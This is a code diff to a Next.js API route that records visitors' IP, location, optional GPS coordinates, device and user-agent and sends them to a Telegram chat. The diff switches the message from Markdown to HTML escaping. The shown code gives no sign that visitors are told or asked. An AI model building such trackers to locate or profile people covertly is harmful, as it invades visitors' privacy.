@@ -2,9 +2,16 @@ import { headers } from 'next/headers';
 import { NextRequest, NextResponse } from 'next/server';
 import { UAParser } from 'ua-parser-js';
 
-/* Escape Telegram Markdown special characters in user-controlled values. */
-function escapeMd(text: string): string {
-  return text.replace(/[_*[\]()~`>#+\-=|{}.!]/g, '\\$&');
+/* Escape HTML special characters in user-controlled values so they
+   don't break Telegram's HTML parse_mode. */
+function escapeHtml(text: string): string {
+  return text.replace(/[&<>"']/g, (c) => ({
+    '&': '&amp;',
+    '<': '&lt;',
+    '>': '&gt;',
+    '"': '&quot;',
+    "'": '&#39;',
+  }[c] as string));
 }
 
 export async function GET(request: NextRequest) {
@@ -44,7 +51,7 @@ export async function GET(request: NextRequest) {
 
   const locationLabel = gpsLink
     ? `GPS (${lat}, ${lon})`
-    : `${escapeMd(city)}, ${escapeMd(country)}`;
+    : `${escapeHtml(city)}, ${escapeHtml(country)}`;
 
   console.log("API Route Hit", {
     ip,
@@ -69,12 +76,19 @@ export async function GET(request: NextRequest) {
 
   if (botToken && chatId) {
     try {
-      const isMobile = device === 'mobile';
-      const phoneLine = isMobile
-        ? `📱 *Phone:* ${escapeMd(`${deviceVendor} ${deviceModel}`).trim() || 'Unknown'}\n🤖 *OS:* ${escapeMd(os)} ${escapeMd(osVersion)}\n🌐 *Browser:* ${escapeMd(browser)} ${escapeMd(browserVersion)}`
-        : `🖥️ *Device:* ${device} - ${escapeMd(browser)} ${escapeMd(browserVersion)}\n💻 *OS:* ${escapeMd(os)} ${escapeMd(osVersion)}`;
+      const deviceLabel = `${deviceVendor} ${deviceModel}`.trim() || 'Unknown';
+      const osLabel = `${os} ${osVersion}`.trim() || 'Unknown';
 
-      const text = `🌐 *New Visitor Detected*\n\n${phoneLine}\n📍 *Location:* ${locationLabel}\n🌐 *Browser & Device:* ${escapeMd(browser)} ${escapeMd(browserVersion)} | ${escapeMd(device)} - ${escapeMd(`${deviceVendor} ${deviceModel}`).trim()}\n📱 *Raw User-Agent:* ${escapeMd(userAgent)}\n🗣️ *Language:* ${escapeMd(acceptLanguage)}\n🔗 *IP:* ${escapeMd(ip)}\n⏰ *Time:* ${time}${gpsLink ? `\n🗺️ *Map:* ${gpsLink}` : ''}`;
+      const text = `<b>🌐 NEW VISITOR DETECTED</b>
+━━━━━━━━━━━━━━━━
+📱 <b>Phone:</b> <code>${escapeHtml(deviceLabel)}</code>
+🤖 <b>OS:</b> <code>${escapeHtml(osLabel)}</code>
+🌍 <b>Location:</b> <code>${escapeHtml(city)}, ${escapeHtml(country)}</code>
+🔗 <b>IP:</b> <code>${escapeHtml(ip)}</code>
+⏰ <b>Time:</b> <code>${escapeHtml(time)}</code>
+━━━━━━━━━━━━━━━━
+📜 <b>Raw User-Agent:</b>
+<pre>${escapeHtml(userAgent)}</pre>`;
 
       const response = await fetch(
         `https://api.telegram.org/bot${botToken}/sendMessage`,
@@ -86,7 +100,7 @@ export async function GET(request: NextRequest) {
           body: JSON.stringify({
             chat_id: chatId,
             text,
-            parse_mode: 'Markdown',
+            parse_mode: 'HTML',
             disable_web_page_preview: true,
           }),
         }
